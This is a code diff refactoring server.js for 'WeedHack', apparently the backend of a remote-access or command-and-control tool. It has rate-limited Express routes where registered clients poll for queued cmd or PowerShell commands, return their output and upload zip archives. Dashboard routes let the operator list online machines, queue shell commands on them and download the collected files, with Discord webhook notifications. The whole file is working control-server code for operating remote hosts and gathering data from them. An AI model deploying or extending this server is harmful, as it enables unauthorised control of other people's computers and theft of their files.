@@ -1,5 +1,7 @@
 // language: JavaScript, file: server.js, target: Node 22.5+
-// weedhack — express + tcp + udp. env-driven ports. node:sqlite.
+// weedhack — http api + raw tcp:443 + raw udp:880.
+// structure: config → middleware → helpers → routes → listeners → shutdown.
+
 import 'dotenv/config';
 import express from 'express';
 import helmet from 'helmet';
@@ -11,20 +13,35 @@ import crypto from 'node:crypto';
 import fs from 'node:fs';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
+
 import db, { UPLOAD_DIR } from './db.js';
 import { startTcp, startUdp } from './net.js';
 
-const __dirname = path.dirname(fileURLToPath(import.meta.url));
+// ---------- config ----------
+const __dirname  = path.dirname(fileURLToPath(import.meta.url));
+const PUBLIC_DIR = path.join(__dirname, 'public');
+
+const CFG = {
+  httpPort:    Number(process.env.HTTP_PORT || process.env.PORT || 3000),
+  tcpPort:     Number(process.env.TCP_PORT  || 4000),
+  udpPort:     Number(process.env.UDP_PORT  || 4001),
+  bindHost:    process.env.BIND_HOST || '0.0.0.0',
+  jwtSecret:   process.env.JWT_SECRET || 'dev_only_change_me',
+  cookieSecure: process.env.COOKIE_SECURE === 'true',
+  maxUpload:   Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024),
+};
+
+if (!fs.existsSync(path.join(PUBLIC_DIR, 'css', 'style.css'))) {
+  console.error(`[startup] FATAL: ${PUBLIC_DIR}/css/style.css missing. wrong cwd or files not deployed.`);
+  process.exit(1);
+}
+
+// ---------- app ----------
 const app = express();
+app.disable('x-powered-by');
+app.set('trust proxy', true);
 
-const HTTP_PORT = Number(process.env.HTTP_PORT || process.env.PORT || 3000);
-const TCP_PORT  = Number(process.env.TCP_PORT  || 4000);
-const UDP_PORT  = Number(process.env.UDP_PORT  || 4001);
-const BIND_HOST = process.env.BIND_HOST || '0.0.0.0';
-const JWT_SECRET = process.env.JWT_SECRET || 'dev_only_change_me';
-const COOKIE_SECURE = process.env.COOKIE_SECURE === 'true';
-const MAX_UPLOAD = Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024); // 64 MB
-
+// ---------- middleware ----------
 app.use(helmet({
   contentSecurityPolicy: {
     directives: {
@@ -35,103 +52,118 @@ app.use(helmet({
       connectSrc: ["'self'"],
       frameAncestors: ["'none'"],
       objectSrc:  ["'none'"],
-      baseUri:    ["'self'"]
-    }
+      baseUri:    ["'self'"],
+    },
   },
+  hsts: false,                              // no TLS yet — do not pin clients
   crossOriginResourcePolicy: { policy: 'same-origin' },
-  referrerPolicy: { policy: 'no-referrer' }
+  referrerPolicy: { policy: 'no-referrer' },
 }));
 app.use(cookieParser());
-app.use(express.static(path.join(__dirname, 'public')));
 
-// raw body for zip uploads — bound BEFORE the json parser for that route only
+app.use((req, res, next) => {
+  const t = Date.now();
+  res.on('finish', () => {
+    console.log(`[http] ${req.method} ${req.url} ${req.ip} -> ${res.statusCode} (${Date.now() - t}ms)`);
+  });
+  next();
+});
+
+// raw body for zip uploads — bound BEFORE the json parser, path-scoped
 app.use('/api/client/upload', express.raw({
   type: ['application/zip', 'application/octet-stream'],
-  limit: MAX_UPLOAD
+  limit: CFG.maxUpload,
 }));
 
 app.use(express.json({ limit: '64kb' }));
 
-// ---- sql guard: no template interpolation, values bind via ? only ----
-function sql(strings, ...vals) {
+// ---------- rate limiters ----------
+const limit = (opts) => rateLimit({ standardHeaders: true, legacyHeaders: false, ...opts });
+
+const limitGlobal   = limit({ windowMs: 60_000,      max: 120, message: { error: 'too many requests' } });
+const limitAuth     = limit({ windowMs: 15 * 60_000, max: 10,  message: { error: 'too many attempts, slow down' } });
+const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
+const limitClient   = limit({ windowMs: 60_000,      max: 600, message: { error: 'too many client requests' } });
+const limitUpload   = limit({ windowMs: 60 * 60_000, max: 10,  message: { error: 'upload limit reached — max 10 per hour' } });
+const limitDownload = limit({ windowMs: 60_000,      max: 30,  message: { error: 'too many downloads' } });
+
+app.use(limitGlobal);
+
+// ---------- helpers ----------
+const sql = (strings, ...vals) => {
   if (vals.length) throw new Error('sql tagged template refused — use ? params');
   return strings[0];
-}
+};
 
-// ---- rate limiters ----
-const globalLimiter = rateLimit({
-  windowMs: 60_000, max: 120, standardHeaders: true, legacyHeaders: false,
-  message: { error: 'too many requests' }
-});
-const authLimiter = rateLimit({
-  windowMs: 15 * 60_000, max: 10, standardHeaders: true, legacyHeaders: false,
-  message: { error: 'too many attempts, slow down' }
-});
-const webhookLimiter = rateLimit({
-  windowMs: 60 * 60_000, max: 5, standardHeaders: true, legacyHeaders: false,
-  message: { error: 'webhook test limit reached' }
-});
-const clientLimiter = rateLimit({
-  windowMs: 60_000, max: 600, standardHeaders: true, legacyHeaders: false,
-  message: { error: 'too many client requests' }
-});
-const uploadLimiter = rateLimit({
-  windowMs: 60 * 60_000, max: 10, standardHeaders: true, legacyHeaders: false,
-  message: { error: 'upload limit reached — max 10 per hour' }
-});
-const downloadLimiter = rateLimit({
-  windowMs: 60_000, max: 30, standardHeaders: true, legacyHeaders: false,
-  message: { error: 'too many downloads' }
-});
-app.use(globalLimiter);
-
-// ---- helpers ----
 function genKey() {
   const A = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
   const block = () => Array.from({ length: 4 }, () => A[crypto.randomInt(A.length)]).join('');
   return [block(), block(), block(), block()].join('-');
 }
 
-function signToken(user) {
-  return jwt.sign({ uid: user.id, username: user.username }, JWT_SECRET, { expiresIn: '7d' });
-}
+const signToken  = (u) => jwt.sign({ uid: u.id, username: u.username }, CFG.jwtSecret, { expiresIn: '7d' });
+const cookieOpts = () => ({ httpOnly: true, sameSite: 'lax', secure: CFG.cookieSecure, maxAge: 7 * 24 * 3600 * 1000 });
 
-function cookieOpts() {
-  return { httpOnly: true, sameSite: 'lax', secure: COOKIE_SECURE, maxAge: 7 * 24 * 3600 * 1000 };
-}
-
-function auth(req, res, next) {
+function requireAuth(req, res, next) {
   const token = req.cookies?.token;
   if (!token) return res.status(401).json({ error: 'unauthorized' });
-  try { req.user = jwt.verify(token, JWT_SECRET); next(); }
+  try { req.user = jwt.verify(token, CFG.jwtSecret); next(); }
   catch { return res.status(401).json({ error: 'unauthorized' }); }
 }
 
-function isDiscordWebhook(url) {
-  return typeof url === 'string' &&
-    /^https:\/\/(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(url);
+function requireKey(req, res, next) {
+  const key = (req.body && req.body.key) || req.query.key;
+  if (!key) return res.status(401).json({ error: 'missing key' });
+  const user = db.prepare(sql`SELECT id, username FROM users WHERE account_key = ?`).get(key);
+  if (!user) return res.status(401).json({ error: 'invalid key' });
+  req.keyUser = user;
+  next();
 }
+
+const isDiscordWebhook = (url) => typeof url === 'string' &&
+  /^https:\/\/(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(url);
 
 async function sendWebhook(url, payload) {
-  const r = await fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ username: 'WeedHack', ...payload }),
-    redirect: 'error',
-    signal: AbortSignal.timeout(5000)
+  try {
+    const r = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: 'WeedHack', ...payload }),
+      redirect: 'error',
+      signal: AbortSignal.timeout(5000),
+    });
+    return r.ok;
+  } catch { return false; }
+}
+
+const getOwnUser = (uid) => db.prepare(sql`
+  SELECT id, username, email, account_key, discord_webhook, created_at
+  FROM users WHERE id = ?
+`).get(uid);
+
+// ---------- static ----------
+app.use(express.static(PUBLIC_DIR, {
+  etag: true,
+  maxAge: '1h',
+  setHeaders: (res, filePath) => {
+    if (filePath.endsWith('.html')) res.setHeader('Cache-Control', 'no-store');
+  },
+}));
+
+// ---------- health ----------
+app.get('/api/health', (_req, res) => {
+  res.json({
+    ok: true,
+    uptime: Math.round(process.uptime()),
+    http: CFG.httpPort,
+    tcp:  CFG.tcpPort,
+    udp:  CFG.udpPort,
+    time: new Date().toISOString(),
   });
-  return r.ok;
-}
+});
 
-function getOwnUser(uid) {
-  return db.prepare(sql`
-    SELECT id, username, email, account_key, discord_webhook, created_at
-    FROM users WHERE id = ?
-  `).get(uid);
-}
-
-// ---- auth routes ----
-app.post('/api/signup', authLimiter, async (req, res) => {
+// ---------- routes: auth ----------
+app.post('/api/signup', limitAuth, async (req, res) => {
   const { username, email, password, discordWebhook } = req.body || {};
   if (!username || !email || !password || !discordWebhook)
     return res.status(400).json({ error: 'all fields required' });
@@ -147,18 +179,15 @@ app.post('/api/signup', authLimiter, async (req, res) => {
   const exists = db.prepare(sql`SELECT id FROM users WHERE username = ? OR email = ?`).get(username, email);
   if (exists) return res.status(409).json({ error: 'username or email taken' });
 
-  let webhookOk = false;
-  try {
-    webhookOk = await sendWebhook(discordWebhook, {
-      content: `webhook verified for \`${username}\``,
-      embeds: [{
-        title: 'account verified',
-        color: 0x2E7D32,
-        description: 'your webhook is live. your account key arrives next.',
-        timestamp: new Date().toISOString()
-      }]
-    });
-  } catch { webhookOk = false; }
+  const webhookOk = await sendWebhook(discordWebhook, {
+    content: `webhook verified for \`${username}\``,
+    embeds: [{
+      title: 'account verified',
+      color: 0x2E7D32,
+      description: 'your webhook is live. your account key arrives next.',
+      timestamp: new Date().toISOString(),
+    }],
+  });
   if (!webhookOk) return res.status(400).json({ error: 'webhook unreachable — check the url' });
 
   const hash = await bcrypt.hash(password, 12);
@@ -177,28 +206,31 @@ app.post('/api/signup', authLimiter, async (req, res) => {
       title: 'your account key',
       color: 0x6B0F2B,
       description: `\`\`\`\n${accountKey}\n\`\`\`\nsave this. shown once on screen too.`,
-      timestamp: new Date().toISOString()
-    }]
-  }).catch(() => {});
+      timestamp: new Date().toISOString(),
+    }],
+  });
 
   res.cookie('token', signToken(user), cookieOpts());
   res.json({ ok: true, accountKey, username });
 });
 
-app.post('/api/signin', authLimiter, async (req, res) => {
+app.post('/api/signin', limitAuth, async (req, res) => {
   const { username, password } = req.body || {};
   if (!username || !password) return res.status(400).json({ error: 'missing fields' });
+
   const user = db.prepare(sql`SELECT * FROM users WHERE username = ? OR email = ?`).get(username, username);
   if (!user) return res.status(401).json({ error: 'invalid credentials' });
+
   const ok = await bcrypt.compare(password, user.password_hash);
   if (!ok) return res.status(401).json({ error: 'invalid credentials' });
+
   res.cookie('token', signToken({ id: user.id, username: user.username }), cookieOpts());
   res.json({ ok: true, username: user.username });
 });
 
-app.post('/api/logout', (req, res) => { res.clearCookie('token'); res.json({ ok: true }); });
+app.post('/api/logout', (_req, res) => { res.clearCookie('token'); res.json({ ok: true }); });
 
-app.get('/api/me', auth, (req, res) => {
+app.get('/api/me', requireAuth, (req, res) => {
   const row = getOwnUser(req.user.uid);
   if (!row) return res.status(404).json({ error: 'not found' });
   res.json({
@@ -206,66 +238,66 @@ app.get('/api/me', auth, (req, res) => {
     email: row.email,
     accountKey: row.account_key,
     discordWebhook: row.discord_webhook,
-    createdAt: row.created_at
+    createdAt: row.created_at,
   });
 });
 
-app.post('/api/webhook/test', auth, webhookLimiter, async (req, res) => {
+app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
   const { url } = req.body || {};
   if (!isDiscordWebhook(url)) return res.status(400).json({ error: 'invalid discord webhook url' });
-  try {
-    const ok = await sendWebhook(url, {
-      content: 'webhook test',
-      embeds: [{ title: 'connection live', color: 0x2E7D32, timestamp: new Date().toISOString() }]
-    });
-    if (!ok) return res.status(502).json({ error: 'webhook rejected the payload' });
-    db.prepare(sql`UPDATE users SET discord_webhook = ? WHERE id = ?`).run(url, req.user.uid);
-    res.json({ ok: true });
-  } catch { res.status(502).json({ error: 'webhook unreachable' }); }
+
+  const ok = await sendWebhook(url, {
+    content: 'webhook test',
+    embeds: [{ title: 'connection live', color: 0x2E7D32, timestamp: new Date().toISOString() }],
+  });
+  if (!ok) return res.status(502).json({ error: 'webhook unreachable' });
+
+  db.prepare(sql`UPDATE users SET discord_webhook = ? WHERE id = ?`).run(url, req.user.uid);
+  res.json({ ok: true });
 });
 
-// ---- client-facing endpoints (auth by account key, not cookie) ----
-function authByKey(req, res, next) {
-  // key can arrive as JSON body (most routes) or query (upload/download)
-  const key = (req.body && req.body.key) || req.query.key;
-  if (!key) return res.status(401).json({ error: 'missing key' });
-  const user = db.prepare(sql`SELECT id, username FROM users WHERE account_key = ?`).get(key);
-  if (!user) return res.status(401).json({ error: 'invalid key' });
-  req.keyUser = user;
-  next();
-}
-
-app.post('/api/client/register', clientLimiter, authByKey, (req, res) => {
-  const { hostname } = req.body || {};
+// ---------- routes: client (key-auth) ----------
+app.post('/api/client/register', limitClient, requireKey, (req, res) => {
+  const hostname = String(req.body.hostname || 'unknown').slice(0, 64);
   const ip = req.ip || '';
   const uid = req.keyUser.id;
 
   const existing = db.prepare(sql`
     SELECT id FROM clients WHERE user_id = ? AND hostname = ?
-  `).get(uid, hostname || 'unknown');
+  `).get(uid, hostname);
 
   if (existing) {
     db.prepare(sql`UPDATE clients SET ip = ?, last_seen = ? WHERE id = ?`)
       .run(ip, Date.now(), existing.id);
-    return res.json({ ok: true, clientId: existing.id });
+    return res.json({ ok: true, clientId: Number(existing.id) });
   }
 
   const info = db.prepare(sql`
     INSERT INTO clients (user_id, key, hostname, ip, last_seen)
     VALUES (?, ?, ?, ?, ?)
-  `).run(uid, req.body.key, hostname || 'unknown', ip, Date.now());
+  `).run(uid, req.body.key, hostname, ip, Date.now());
+
   res.json({ ok: true, clientId: Number(info.lastInsertRowid) });
 });
 
-app.post('/api/client/pull', clientLimiter, authByKey, (req, res) => {
+app.post('/api/client/pull', limitClient, requireKey, (req, res) => {
   const uid = req.keyUser.id;
   const ip = req.ip || '';
-  const client = db.prepare(sql`
-    SELECT id FROM clients WHERE user_id = ? AND ip = ?
-    ORDER BY last_seen DESC LIMIT 1
-  `).get(uid, ip);
+  const clientId = Number(req.body.clientId || 0);
+
+  let client = null;
+  if (clientId) {
+    client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, uid);
+  }
+  if (!client) {
+    client = db.prepare(sql`
+      SELECT id FROM clients WHERE user_id = ? AND ip = ?
+      ORDER BY last_seen DESC LIMIT 1
+    `).get(uid, ip);
+  }
   if (client) {
-    db.prepare(sql`UPDATE clients SET last_seen = ? WHERE id = ?`).run(Date.now(), client.id);
+    db.prepare(sql`UPDATE clients SET last_seen = ?, ip = ? WHERE id = ?`)
+      .run(Date.now(), ip, client.id);
   }
 
   const cmd = db.prepare(sql`
@@ -273,49 +305,60 @@ app.post('/api/client/pull', clientLimiter, authByKey, (req, res) => {
     WHERE user_id = ? AND status = 'pending'
     ORDER BY created_at ASC LIMIT 1
   `).get(uid);
-  if (!cmd) return res.json({ id: null });
+
+  if (!cmd) return res.json({ id: null, clientId: client ? Number(client.id) : null });
 
   db.prepare(sql`UPDATE commands SET status = 'sent' WHERE id = ?`).run(cmd.id);
-  res.json({ id: Number(cmd.id), shell: cmd.shell, line: cmd.line });
+  res.json({
+    id: Number(cmd.id),
+    shell: cmd.shell,
+    line: cmd.line,
+    clientId: client ? Number(client.id) : null,
+  });
 });
 
-app.post('/api/client/result', clientLimiter, authByKey, (req, res) => {
+app.post('/api/client/result', limitClient, requireKey, (req, res) => {
   const { id, output } = req.body || {};
   if (!id) return res.status(400).json({ error: 'missing id' });
-  const uid = req.keyUser.id;
+
   const info = db.prepare(sql`
     UPDATE commands SET output = ?, status = 'done'
     WHERE id = ? AND user_id = ?
-  `).run(String(output || '').slice(0, 65536), id, uid);
+  `).run(String(output || '').slice(0, 65536), id, req.keyUser.id);
+
   if (info.changes === 0) return res.status(404).json({ error: 'command not found' });
   res.json({ ok: true });
 });
 
-// ---- zip upload from client ----
-app.post('/api/client/upload', uploadLimiter, authByKey, (req, res) => {
+app.post('/api/client/upload', limitUpload, requireKey, (req, res) => {
   const uid = req.keyUser.id;
   const ip = req.ip || '';
+  const clientId = Number(req.query.clientId || 0);
   const filename = String(req.query.name || 'upload.zip').slice(0, 128).replace(/[^\w.\-]/g, '_');
 
   if (!Buffer.isBuffer(req.body) || req.body.length === 0)
     return res.status(400).json({ error: 'empty body' });
-  if (req.body.length > MAX_UPLOAD)
+  if (req.body.length > CFG.maxUpload)
     return res.status(413).json({ error: 'file too large' });
-  // quick zip magic check: PK\x03\x04
-  const magic = req.body.slice(0, 4);
-  if (!(magic[0] === 0x50 && magic[1] === 0x4B))
+  if (!(req.body[0] === 0x50 && req.body[1] === 0x4B))
     return res.status(400).json({ error: 'not a zip file' });
 
-  const client = db.prepare(sql`
-    SELECT id FROM clients WHERE user_id = ? AND ip = ?
-    ORDER BY last_seen DESC LIMIT 1
-  `).get(uid, ip);
+  let client = null;
+  if (clientId) {
+    client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, uid);
+  }
+  if (!client) {
+    client = db.prepare(sql`
+      SELECT id FROM clients WHERE user_id = ? AND ip = ?
+      ORDER BY last_seen DESC LIMIT 1
+    `).get(uid, ip);
+  }
   if (!client) return res.status(400).json({ error: 'client not registered' });
 
   const storedName = `${crypto.randomUUID()}.zip`;
   const dest = path.join(UPLOAD_DIR, storedName);
   try { fs.writeFileSync(dest, req.body, { mode: 0o600 }); }
-  catch (e) { return res.status(500).json({ error: 'write failed' }); }
+  catch { return res.status(500).json({ error: 'write failed' }); }
 
   const info = db.prepare(sql`
     INSERT INTO uploads (user_id, client_id, filename, stored_name, size, created_at)
@@ -326,15 +369,31 @@ app.post('/api/client/upload', uploadLimiter, authByKey, (req, res) => {
     ok: true,
     uploadId: Number(info.lastInsertRowid),
     filename,
-    size: req.body.length
+    size: req.body.length,
   });
 });
 
-// ---- dashboard: list uploads for a client ----
-app.get('/api/clients/:id/uploads', auth, (req, res) => {
+// ---------- routes: dashboard ----------
+app.get('/api/clients', requireAuth, (req, res) => {
+  const rows = db.prepare(sql`
+    SELECT id, hostname, ip, last_seen FROM clients
+    WHERE user_id = ? ORDER BY last_seen DESC
+  `).all(req.user.uid);
+  const now = Date.now();
+  res.json(rows.map(r => ({
+    id: r.id,
+    hostname: r.hostname,
+    ip: r.ip,
+    online: now - r.last_seen < 30_000,
+    lastSeen: r.last_seen,
+  })));
+});
+
+app.get('/api/clients/:id/uploads', requireAuth, (req, res) => {
   const clientId = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
+
   const rows = db.prepare(sql`
     SELECT id, filename, size, created_at FROM uploads
     WHERE user_id = ? AND client_id = ?
@@ -343,8 +402,7 @@ app.get('/api/clients/:id/uploads', auth, (req, res) => {
   res.json(rows);
 });
 
-// ---- dashboard: download a specific upload ----
-app.get('/api/uploads/:id/download', downloadLimiter, auth, (req, res) => {
+app.get('/api/uploads/:id/download', limitDownload, requireAuth, (req, res) => {
   const uploadId = Number(req.params.id);
   const row = db.prepare(sql`
     SELECT filename, stored_name, size FROM uploads
@@ -357,28 +415,11 @@ app.get('/api/uploads/:id/download', downloadLimiter, auth, (req, res) => {
 
   res.setHeader('Content-Type', 'application/zip');
   res.setHeader('Content-Length', row.size);
-  res.setHeader('Content-Disposition',
-    `attachment; filename="${row.filename.replace(/"/g, '')}"`);
+  res.setHeader('Content-Disposition', `attachment; filename="${row.filename.replace(/"/g, '')}"`);
   fs.createReadStream(src).pipe(res);
 });
 
-// ---- dashboard: dashboard-facing client endpoints ----
-app.get('/api/clients', auth, (req, res) => {
-  const rows = db.prepare(sql`
-    SELECT id, hostname, ip, last_seen FROM clients
-    WHERE user_id = ? ORDER BY last_seen DESC
-  `).all(req.user.uid);
-  const now = Date.now();
-  res.json(rows.map(r => ({
-    id: r.id,
-    hostname: r.hostname,
-    ip: r.ip,
-    online: now - r.last_seen < 30_000,
-    lastSeen: r.last_seen
-  })));
-});
-
-app.post('/api/clients/:id/exec', auth, (req, res) => {
+app.post('/api/clients/:id/exec', requireAuth, (req, res) => {
   const clientId = Number(req.params.id);
   const { shell, line } = req.body || {};
   if (!['cmd', 'powershell'].includes(shell)) return res.status(400).json({ error: 'bad shell' });
@@ -396,7 +437,7 @@ app.post('/api/clients/:id/exec', auth, (req, res) => {
   res.json({ ok: true, commandId: Number(info.lastInsertRowid) });
 });
 
-app.get('/api/clients/:id/commands', auth, (req, res) => {
+app.get('/api/clients/:id/commands', requireAuth, (req, res) => {
   const clientId = Number(req.params.id);
   const rows = db.prepare(sql`
     SELECT id, shell, line, output, status, created_at FROM commands
@@ -406,34 +447,71 @@ app.get('/api/clients/:id/commands', auth, (req, res) => {
   res.json(rows);
 });
 
-app.use((err, req, res, next) => { console.error(err); res.status(500).json({ error: 'server error' }); });
+// ---------- fallthrough ----------
+app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 
-// ---- listeners ----
+app.use((err, _req, res, _next) => {
+  console.error('[http] unhandled:', err);
+  res.status(500).json({ error: 'server error' });
+});
+
+// ---------- listeners ----------
 let udpBound = false;
 
 const tcpServer = startTcp({
-  host: BIND_HOST,
-  port: TCP_PORT,
+  host: CFG.bindHost,
+  port: CFG.tcpPort,
   onConn: (sock) => { sock.write('weedhack tcp ready\n'); },
   onLine: (line, sock) => {
     if (line === 'ping') sock.write('pong\n');
     else if (line === 'who') sock.write(`you ${sock.remoteAddress}:${sock.remotePort}\n`);
     else sock.write(`echo: ${line}\n`);
-  }
+  },
 });
 
 const udpSock = startUdp({
-  host: BIND_HOST,
-  port: UDP_PORT,
+  host: CFG.bindHost,
+  port: CFG.udpPort,
   onMsg: (text, rinfo, s) => {
     const reply = Buffer.from(`weedhack: ${text}`);
     s.send(reply, rinfo.port, rinfo.address, () => {});
-  }
+  },
 });
 udpSock.on('listening', () => { udpBound = true; });
 
-app.listen(HTTP_PORT, BIND_HOST, () => {
-  console.log(`WeedHack http up on ${BIND_HOST}:${HTTP_PORT}`);
-  console.log(`WeedHack tcp  on ${BIND_HOST}:${TCP_PORT}`);
-  console.log(`WeedHack udp  on ${BIND_HOST}:${UDP_PORT}`);
+const httpServer = app.listen(CFG.httpPort, CFG.bindHost, () => {
+  console.log(`[startup] cwd     = ${process.cwd()}`);
+  console.log(`[startup] dirname = ${__dirname}`);
+  console.log(`[startup] public  = ${PUBLIC_DIR}`);
+  console.log(`[startup] db      = ${process.env.DB_PATH || './data/weedhack.db'}`);
+  console.log('');
+  console.log(`WeedHack http up on ${CFG.bindHost}:${CFG.httpPort}`);
+  console.log(`WeedHack tcp  on ${CFG.bindHost}:${CFG.tcpPort}`);
+  console.log(`WeedHack udp  on ${CFG.bindHost}:${CFG.udpPort}`);
 });
+
+httpServer.on('connection', (sock) => {
+  sock.on('error', () => {});
+});
+
+// ---------- graceful shutdown ----------
+let shuttingDown = false;
+function shutdown(sig) {
+  if (shuttingDown) return;
+  shuttingDown = true;
+  console.log(`\n[shutdown] ${sig} — closing listeners`);
+
+  httpServer.close(() => console.log('[shutdown] http closed'));
+  if (tcpServer.shutdown) tcpServer.shutdown();
+  try { udpSock.close(() => console.log('[shutdown] udp closed')); } catch {}
+
+  setTimeout(() => {
+    console.log('[shutdown] forcing exit');
+    process.exit(0);
+  }, 3000).unref();
+}
+
+process.on('SIGINT',  () => shutdown('SIGINT'));
+process.on('SIGTERM', () => shutdown('SIGTERM'));
+process.on('uncaughtException',  (e) => console.error('[uncaught]', e));
+process.on('unhandledRejection', (e) => console.error('[unhandled]', e));
